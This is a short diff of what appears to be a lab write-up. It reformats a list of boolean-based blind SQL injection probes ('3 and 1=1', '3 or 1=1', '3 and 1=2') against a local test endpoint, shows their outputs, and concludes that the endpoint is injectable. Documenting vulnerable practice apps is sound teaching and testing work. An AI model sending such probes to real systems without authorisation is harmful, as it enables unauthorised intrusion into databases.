@@ -19,8 +19,8 @@ and notice that the output is the string FOUND
 2. The same API when accessed with the path parameter as 6 does not give anything
 `http://127.0.0.1:5000/users/6`
 3. Playing with the endpoint gives the results as shown in the comments:
-`http://127.0.0.1:5000/users/3 and 1=1` => FOUND 
-`http://127.0.0.1:5000/users/3 or 1=1` => FOUND FOUND FOUND FOUND FOUND
-`http://127.0.0.1:5000/users/3 and 1=2` => <gives nothing>
+- `http://127.0.0.1:5000/users/3 and 1=1` => FOUND 
+- `http://127.0.0.1:5000/users/3 or 1=1` => FOUND FOUND FOUND FOUND FOUND
+- `http://127.0.0.1:5000/users/3 and 1=2` => <gives nothing>
 
 **The above tests prove that the endpoint is indeed vulnerable to SQL injection (blind boolean)**
